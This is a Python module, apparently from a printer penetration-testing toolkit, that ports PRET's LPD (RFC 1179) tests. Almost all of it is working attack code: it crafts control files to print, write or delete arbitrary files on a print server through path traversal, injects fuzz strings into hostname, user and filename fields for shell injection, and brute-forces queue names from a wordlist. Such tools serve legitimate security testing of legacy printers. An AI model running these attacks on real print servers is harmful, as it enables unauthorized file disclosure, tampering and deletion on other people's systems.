#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LPD (RFC 1179) security testing — native port of RUB-NDS/PRET lpd/lpdtest.py
and lpdprint.py. Tests legacy LPD implementations for path traversal, arbitrary
file write/delete, shell injection, and queue brute-force.
"""

from __future__ import annotations

import os
import socket
from pathlib import Path
from typing import List, Optional, Tuple

from utils.helper import output

_DEFAULT_QUEUE = "lp"
_DATA_DIR = Path(__file__).resolve().parents[1] / "data"
_DEFAULT_QUEUE_LIST = _DATA_DIR / "printerLpdList.txt"


def _ack(sock: socket.socket) -> bool:
    data = sock.recv(4096)
    return data == b"\000"


def _connect(host: str, port: int, timeout: float = 10.0) -> socket.socket:
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    return s


def _abort(sock: socket.socket) -> None:
    try:
        sock.send(b"\001\n")
    except OSError:
        pass
    try:
        sock.close()
    except OSError:
        pass


def _send_job(
    host: str,
    port: int,
    ctrl: str,
    data: str,
    *,
    queue: str = _DEFAULT_QUEUE,
    ctrlfile: str = "cfA001",
    datafile: str = "dfA001",
    timeout: float = 10.0,
) -> Tuple[bool, str]:
    """RFC 1179 receive-job sequence."""
    try:
        s = _connect(host, port, timeout)
    except OSError as exc:
        return False, f"connect failed: {exc}"

    try:
        s.send(f"\002{queue}\n".encode())
        if not _ack(s):
            _abort(s)
            return False, "negative acknowledgement on queue open"

        s.send(f"\002{len(ctrl)} {ctrlfile}\n".encode())
        if not _ack(s):
            _abort(s)
            return False, "negative acknowledgement on control file"

        s.send((ctrl + "\000").encode())
        if not _ack(s):
            _abort(s)
            return False, "negative acknowledgement on control payload"

        s.send(f"\003{len(data)} {datafile}\n".encode())
        if not _ack(s):
            _abort(s)
            return False, "negative acknowledgement on data open"

        s.send((data + "\000").encode())
        if not _ack(s):
            _abort(s)
            return False, "negative acknowledgement on data payload"

        s.close()
        return True, "job accepted"
    except OSError as exc:
        _abort(s)
        return False, str(exc)


def lpd_print(
    host: str,
    filepath: str,
    *,
    port: int = 515,
    queue: str = _DEFAULT_QUEUE,
    timeout: float = 10.0,
) -> Tuple[bool, str]:
    """Send a local file to an LPD daemon (PRET lpdprint.py)."""
    path = Path(filepath)
    if not path.is_file():
        return False, f"file not found: {filepath}"
    data = path.read_bytes().decode("latin-1", errors="replace")
    ctrl = f"Hlocalhost\nP{os.getenv('USER', 'root')}\nfd{path.name}\n"
    return _send_job(host, port, ctrl, data, queue=queue, timeout=timeout)


def lpd_test(
    host: str,
    mode: str,
    argument: str,
    *,
    port: int = 515,
    queue: str = _DEFAULT_QUEUE,
    queue_list: Optional[str] = None,
    timeout: float = 10.0,
) -> dict:
    """
    Run an LPD security test.

    Modes: get, put, rm, in, mail, brute
    """
    mode = mode.lower()
    result = {"host": host, "port": port, "mode": mode, "argument": argument, "ok": False, "detail": ""}

    if mode == "brute":
        qfile = queue_list or str(_DEFAULT_QUEUE_LIST)
        found = brute_queue(host, port, qfile, timeout=timeout)
        result["ok"] = bool(found)
        result["detail"] = found or "no valid queue name found"
        result["queue"] = found
        return result

    ctrl = ""
    data = (
        f"Print job from PrinterXPL-Forge LPD test '{mode}' "
        f"argument '{argument}'."
    )
    delname = None
    hostname = ""
    username = "root"
    ctrlfile = "cfA001"
    datafile = "dfA001"
    getname = datafile
    mailname = None

    if mode == "get":
        getname = argument
        data += " If you can read this, the test failed."
        output().info(f"[get] Trying to print file {argument}")
    elif mode == "put":
        ctrlfile = argument
        datafile = argument
        output().info(f"[put] Trying to write to file {argument}")
    elif mode == "rm":
        delname = argument
        output().info(f"[rm] Trying to delete file {argument}")
    elif mode == "in":
        hostname = username = ctrlfile = datafile = delname = argument
        output().info(f"[in] Fuzzing user input: {argument!r}")
    elif mode == "mail":
        try:
            mailname, hostname = argument.split("@", 1)
        except ValueError:
            result["detail"] = "mail mode requires user@host"
            return result
        output().info(f"[mail] Trying to send job info to {argument}")
    else:
        result["detail"] = f"unknown mode: {mode}"
        return result

    if hostname:
        ctrl += f"H{hostname}\n"
    if username:
        ctrl += f"P{username}\n"
    if delname:
        ctrl += f"U{delname}\n"
    if mailname:
        ctrl += f"M{mailname}\n"
    if getname:
        ctrl += f"f{getname}\n"

    ok, detail = _send_job(
        host, port, ctrl, data,
        queue=queue, ctrlfile=ctrlfile, datafile=datafile, timeout=timeout,
    )
    result["ok"] = ok
    result["detail"] = detail
    return result


def brute_queue(host: str, port: int, list_path: str, *, timeout: float = 10.0) -> Optional[str]:
    """Brute-force LPD queue names from a wordlist."""
    try:
        names = Path(list_path).read_text(encoding="utf-8", errors="replace").splitlines()
    except OSError:
        output().errmsg(f"Cannot read queue list: {list_path}")
        return None

    for name in names:
        name = name.strip()
        if not name or name.startswith("#"):
            continue
        try:
            s = _connect(host, port, timeout)
            s.send(f"\002{name}\n".encode())
            if _ack(s):
                s.close()
                output().green(f"Valid LPD queue: {name}")
                return name
            _abort(s)
        except OSError:
            continue
    return None


def run_lpd_fuzz(
    host: str,
    mode: str,
    argument: str = "",
    *,
    port: int = 515,
    queue: str = _DEFAULT_QUEUE,
    queue_list: Optional[str] = None,
    timeout: float = 10.0,
    verbose: bool = True,
) -> dict:
    """CLI entry: run one LPD test and print summary."""
    if mode == "print":
        if not argument:
            return {"ok": False, "detail": "print mode requires a local file path"}
        ok, detail = lpd_print(host, argument, port=port, queue=queue, timeout=timeout)
        result = {"host": host, "port": port, "mode": "print", "ok": ok, "detail": detail}
    else:
        result = lpd_test(
            host, mode, argument,
            port=port, queue=queue, queue_list=queue_list, timeout=timeout,
        )

    if verbose:
        if result.get("ok"):
            output().green(f"[OK] LPD {result['mode']}: {result['detail']}")
        else:
            output().errmsg(f"LPD {result['mode']} failed: {result['detail']}")
    return result


def default_queue_names() -> List[str]:
    if _DEFAULT_QUEUE_LIST.is_file():
        return [
            ln.strip() for ln in _DEFAULT_QUEUE_LIST.read_text(errors="replace").splitlines()
            if ln.strip() and not ln.startswith("#")
        ]
    return [_DEFAULT_QUEUE]
